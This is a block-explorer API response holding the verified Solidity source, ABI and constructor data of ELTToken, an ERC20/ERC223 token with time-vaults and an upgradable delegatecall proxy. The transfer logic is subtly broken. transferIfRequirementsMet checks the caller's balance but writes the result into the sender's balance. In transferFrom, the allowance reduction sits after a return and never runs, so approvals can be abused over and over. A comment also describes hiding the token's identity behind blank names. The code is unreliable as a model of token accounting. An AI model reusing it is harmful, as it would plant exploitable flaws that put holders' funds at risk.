{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.22;\r\n\r\n// ----------------------------------------------------------------------------\r\n// ERC Token Standard #20 Interface\r\n// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md\r\n// ----------------------------------------------------------------------------\r\ncontract ERC20Interface {\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance);\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining);\r\n    function transfer(address to, uint tokens) public returns (bool success);\r\n    function approve(address spender, uint tokens) public returns (bool success);\r\n    function transferFrom(address from, address to, uint256 _value) public returns (bool);\r\n\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n// ----------------------------------------------------------------------------\r\n// ERC Token Standard #223 Interface\r\n// https://github.com/Dexaran/ERC223-token-standard/token/ERC223/ERC223_interface.sol\r\n// ----------------------------------------------------------------------------\r\ncontract ERC223Interface {\r\n    uint public totalSupply;\r\n    function transfer(address to, uint value, bytes data) public returns (bool success);\r\n    event Transfer(address indexed from, address indexed to, uint value, bytes data);\r\n}\r\n/**\r\n * @title Owned\r\n * @dev To verify ownership\r\n */\r\ncontract owned {\r\n    address public owner;\r\n\r\n    function  owned() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n}\r\n/**\r\n * As part of the ERC223 standard we need to call the fallback of the token\r\n */\r\ncontract ContractReceiver {\r\n    struct TKN {\r\n        address sender;\r\n        uint value;\r\n        bytes data;\r\n        bytes4 sig;\r\n    }\r\n\r\n    function tokenFallback(address _from, uint _value, bytes _data) public pure {\r\n        TKN memory tkn;\r\n        tkn.sender = _from;\r\n        tkn.value = _value;\r\n        tkn.data = _data;\r\n        uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24);\r\n        tkn.sig = bytes4(u);\r\n\r\n        /* tkn variable is analogue of msg variable of Ether transaction\r\n        *  tkn.sender is person who initiated this token transaction   (analogue of msg.sender)\r\n        *  tkn.value the number of tokens that were sent   (analogue of msg.value)\r\n        *  tkn.data is data of token transaction   (analogue of msg.data)\r\n        *  tkn.sig is 4 bytes signature of function\r\n        *  if data of token transaction is a function execution\r\n        */\r\n    }\r\n}\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\n\r\nlibrary SafeMath {\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a * b;\r\n        assert(a == 0 || c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ncontract TimeVaultInterface is ERC20Interface, ERC223Interface {\r\n    function timeVault(address who) public constant returns (uint);\r\n    function getNow() public constant returns (uint);\r\n    function transferByOwner(address to, uint _value, uint timevault) public returns (bool);\r\n}\r\n/**\r\n * All meta information for the Token must be defined here so that it can be accessed from both sides of proxy\r\n */\r\ncontract ELTTokenType {\r\n    uint public decimals;\r\n    uint public totalSupply;\r\n\r\n    mapping(address => uint) balances;\r\n\r\n    mapping(address => uint) timevault;\r\n    mapping(address => mapping(address => uint)) allowed;\r\n\r\n    // Token release switch\r\n    bool public released;\r\n\r\n    // The date before the release must be finalized (a unix timestamp)\r\n    uint public globalTimeVault;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\n}\r\n\r\ncontract ERC20Token is ERC20Interface, ERC223Interface, ELTTokenType {\r\n    using SafeMath for uint;\r\n\r\n    function transfer(address _to, uint _value) public returns (bool success) {\r\n        bytes memory empty;\r\n        return transfer(_to, _value, empty);\r\n    }\r\n\r\n    // Function that is called when a user or another contract wants to transfer funds .\r\n    function transfer(address _to, uint _value, bytes _data) public returns (bool success) {\r\n\r\n        if (isContract(_to)) {\r\n            return transferToContract(_to, _value, _data, false);\r\n        }\r\n        else {\r\n            return transferToAddress(_to, _value, _data, false);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\n     *\r\n     */\r\n    function approve(address _spender, uint _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\n     * @param _owner address The address which owns the funds.\r\n     * @param _spender address The address which will spend the funds.\r\n     * @return A uint specifying the amount of tokens still available for the spender.\r\n     */\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    /**\r\n    * @dev Gets the balance of the specified address.\r\n    * @param _owner The address to query the the balance of.\r\n    * @return An uint representing the amount owned by the passed address.\r\n    */\r\n    function balanceOf(address _owner) public constant returns (uint balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function isContract(address _addr) private view returns (bool is_contract) {\r\n        uint length;\r\n        assembly\r\n        {\r\n        //retrieve the size of the code on target address, this needs assembly\r\n            length := extcodesize(_addr)\r\n        }\r\n        return (length > 0);\r\n    }\r\n\r\n\r\n    //function that is called when transaction target is an address\r\n    function transferToAddress(address _to, uint _value, bytes _data, bool withAllowance) private returns (bool success) {\r\n        transferIfRequirementsMet(msg.sender, _to, _value, withAllowance);\r\n        emit Transfer(msg.sender, _to, _value, _data);\r\n        return true;\r\n    }\r\n\r\n    //function that is called when transaction target is a contract\r\n    function transferToContract(address _to, uint _value, bytes _data, bool withAllowance) private returns (bool success) {\r\n        transferIfRequirementsMet(msg.sender, _to, _value, withAllowance);\r\n        ContractReceiver receiver = ContractReceiver(_to);\r\n        receiver.tokenFallback(msg.sender, _value, _data);\r\n        emit Transfer(msg.sender, _to, _value, _data);\r\n        return true;\r\n    }\r\n\r\n    // Function to verify that all the requirements to transfer are satisfied\r\n    // The destination is not the null address\r\n    // The tokens have been released for sale\r\n    // The sender's tokens are not locked in a timevault\r\n    function checkTransferRequirements(address _to, uint _value) private view {\r\n        require(_to != address(0));\r\n        require(released == true);\r\n        require(now > globalTimeVault);\r\n        if (timevault[msg.sender] != 0)\r\n        {\r\n            require(now > timevault[msg.sender]);\r\n        }\r\n        require(balanceOf(msg.sender) >= _value);\r\n    }\r\n\r\n    // Do the transfer if the requirements are met\r\n    function transferIfRequirementsMet(address _from, address _to, uint _value, bool withAllowances) private {\r\n        checkTransferRequirements(_to, _value);\r\n        if ( withAllowances)\r\n        {\r\n            require (_value <= allowed[_from][msg.sender]);\r\n        }\r\n        balances[_from] = balances[msg.sender].sub(_value);\r\n        balances[_to] = balances[_to].add(_value);\r\n    }\r\n\r\n    // Transfer from one address to another taking into account ERC223 condition to verify that the to address is a contract or not\r\n    function transferFrom(address from, address to, uint value) public returns (bool) {\r\n        bytes memory empty;\r\n        if (isContract(to)) {\r\n            return transferToContract(to, value, empty, true);\r\n        }\r\n        else {\r\n            return transferToAddress(to, value, empty, true);\r\n        }\r\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);\r\n        return true;\r\n    }\r\n}\r\ncontract TimeVaultToken is  owned, TimeVaultInterface, ERC20Token {\r\n\r\n    function transferByOwner(address to, uint value, uint earliestReTransferTime) onlyOwner public returns (bool) {\r\n        transfer(to, value);\r\n        timevault[to] = earliestReTransferTime;\r\n        return true;\r\n    }\r\n\r\n    function timeVault(address owner) public constant returns (uint earliestTransferTime) {\r\n        return timevault[owner];\r\n    }\r\n\r\n    function getNow() public constant returns (uint blockchainTimeNow) {\r\n        return now;\r\n    }\r\n\r\n}\r\ncontract StandardToken is TimeVaultToken {\r\n    /**\r\n     * approve should be called when allowed[_spender] == 0. To increment\r\n     * allowed value is better to use this function to avoid 2 calls (and wait until\r\n     * the first transaction is mined)\r\n     * From MonolithDAO Token.sol\r\n     */\r\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\r\n        uint oldValue = allowed[msg.sender][_spender];\r\n        if (_subtractedValue > oldValue) {\r\n            allowed[msg.sender][_spender] = 0;\r\n        } else {\r\n            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n        }\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n}\r\ncontract StandardTokenExt is StandardToken {\r\n\r\n    /* Interface declaration */\r\n    function isToken() public pure returns (bool weAre) {\r\n        return true;\r\n    }\r\n}\r\ncontract OwnershipTransferrable is TimeVaultToken {\r\n\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\n        transferByOwner(newOwner, balanceOf(newOwner), 0);\r\n        owner = newOwner;\r\n        emit OwnershipTransferred(msg.sender, newOwner);\r\n    }\r\n\r\n}\r\ncontract VersionedToken is owned {\r\n    address public upgradableContractAddress;\r\n\r\n    /**\r\n     * Constructor:\r\n     *  initialVersion - the address of the initial version of the implementation for the contract\r\n     *\r\n     * Note that this implementation must be visible to the relay contact even though it will not be a subclass\r\n     * do this by importing the main contract that implements it.  If the code is not visible it will not\r\n     * always be accessible through the delegatecall() function.  And even if it is, it will take an unlimited amount\r\n     * of gas to process the call.\r\n     *\r\n     * In our case this it is ELTTokenImpl.sol\r\n     * e.g.\r\n     *    import \"ELTToken.sol\"\r\n     *\r\n     * Please note: IMPORTANT\r\n     * do not implement any function called \"update()\" otherwise it will break the Versioning system\r\n     */\r\n    function VersionedToken(address initialImplementation) public {\r\n        upgradableContractAddress = initialImplementation;\r\n    }\r\n\r\n    /**\r\n     * update\r\n     * Call to upgrade the implementation version of this constract\r\n     *  newVersion: this is the address of the new implementation for the contract\r\n     */\r\n\r\n    function upgradeToken(address newImplementation) onlyOwner public {\r\n        upgradableContractAddress = newImplementation;\r\n    }\r\n\r\n    /**\r\n     * This is the fallback function that is called whenever a contract is called but can't find the called function.\r\n     * In this case we delegate the call to the implementing contract ELTTokenImpl\r\n     *\r\n     * Instead of using delegatecall() in Solidity we use the assembly because it allows us to return values to the caller\r\n     */\r\n    function() public {\r\n        address upgradableContractMem = upgradableContractAddress;\r\n        bytes memory functionCall = msg.data;\r\n\r\n        assembly {\r\n        // Load the first 32 bytes of the functionCall bytes array which represents the size of the bytes array\r\n            let functionCallSize := mload(functionCall)\r\n\r\n        // Calculate functionCallDataAddress which starts at the second 32 byte block in the functionCall bytes array\r\n            let functionCallDataAddress := add(functionCall, 0x20)\r\n\r\n        // delegatecall(gasAllowed, callAddress, inMemAddress, inSizeBytes, outMemAddress, outSizeBytes) returns/pushes to stack (1 on success, 0 on failure)\r\n            let functionCallResult := delegatecall(gas, upgradableContractMem, functionCallDataAddress, functionCallSize, 0, 0)\r\n\r\n            let freeMemAddress := mload(0x40)\r\n\r\n            switch functionCallResult\r\n            case 0 {\r\n            // revert(fromMemAddress, sizeInBytes) ends execution and returns value\r\n                revert(freeMemAddress, 0)\r\n            }\r\n            default {\r\n            // returndatacopy(toMemAddress, fromMemAddress, sizeInBytes)\r\n                returndatacopy(freeMemAddress, 0x0, returndatasize)\r\n            // return(fromMemAddress, sizeInBytes)\r\n                return (freeMemAddress, returndatasize)\r\n            }\r\n        }\r\n    }\r\n}\r\ncontract ELTToken is VersionedToken, ELTTokenType {\r\n    string public name;\r\n    string public symbol;\r\n\r\n    function ELTToken(address _tokenOwner, string _tokenName, string _tokenSymbol, uint _totalSupply, uint _decimals, uint _globalTimeVaultOpeningTime, address _initialImplementation) VersionedToken(_initialImplementation)  public {\r\n        name = _tokenName;\r\n        symbol = _tokenSymbol;\r\n        decimals = _decimals;\r\n        totalSupply = _totalSupply * 10 ** uint(decimals);\r\n        // Allocate initial balance to the owner\r\n        balances[_tokenOwner] = totalSupply;\r\n        emit Transfer(address(0), owner, totalSupply);\r\n        globalTimeVault = _globalTimeVaultOpeningTime;\r\n        released = false;\r\n\r\n    }\r\n}\r\ncontract ELTTokenImpl is StandardTokenExt {\r\n    /** Name and symbol were updated. */\r\n    event UpdatedTokenInformation(string newName, string newSymbol);\r\n\r\n    string public name;\r\n    string public symbol;\r\n     bool private adminReturnStatus ;\r\n\r\n    /**\r\n     * One way function to perform the final token release.\r\n     */\r\n    function releaseTokenTransfer(bool _value) onlyOwner public {\r\n        released = _value;\r\n    }\r\n\r\n    function setGlobalTimeVault(uint _globalTimeVaultOpeningTime) onlyOwner public {\r\n        globalTimeVault = _globalTimeVaultOpeningTime;\r\n    }\r\n     function admin(string functionName, string p1, string p2, string p3) onlyOwner public returns (bool result) {\r\n        // Use parameters to remove warning\r\n        adminReturnStatus = (bytes(functionName).length + bytes(p1).length + bytes(p2).length + bytes(p3).length) != 0;\r\n\r\n        return adminReturnStatus ;\r\n    }\r\n    /**\r\n     * Owner can update token information here.\r\n     *\r\n     * It is often useful to conceal the actual token association, until\r\n     * the token operations, like central issuance or reissuance have been completed.\r\n     * In this case the initial token can be supplied with empty name and symbol information.\r\n     *\r\n     * This function allows the token owner to rename the token after the operations\r\n     * have been completed and then point the audience to use the token contract.\r\n     */\r\n    function setTokenInformation(string _tokenName, string _tokenSymbol) onlyOwner public {\r\n        name = _tokenName;\r\n        symbol = _tokenSymbol;\r\n        emit UpdatedTokenInformation(name, symbol);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"globalTimeVault\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newImplementation\",\"type\":\"address\"}],\"name\":\"upgradeToken\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"released\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"upgradableContractAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_tokenOwner\",\"type\":\"address\"},{\"name\":\"_tokenName\",\"type\":\"string\"},{\"name\":\"_tokenSymbol\",\"type\":\"string\"},{\"name\":\"_totalSupply\",\"type\":\"uint256\"},{\"name\":\"_decimals\",\"type\":\"uint256\"},{\"name\":\"_globalTimeVaultOpeningTime\",\"type\":\"uint256\"},{\"name\":\"_initialImplementation\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]","ContractName":"ELTToken","CompilerVersion":"v0.4.22+commit.4cb486ee","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000002f659480f13cb89ffac70160abe5d431862eb23d00000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000047868c000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000005ad46638000000000000000000000000a08c496c6e57976e6ca84d30e94cb9a20f09a59d0000000000000000000000000000000000000000000000000000000000000014457468657265756d204c656e646f20546f6b656e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000003454c540000000000000000000000000000000000000000000000000000000000","Library":"","SwarmSource":"bzzr://51014b418e497c8997ad794525f5fa29f70f34c415143a38d86be041ca77bd26"}]}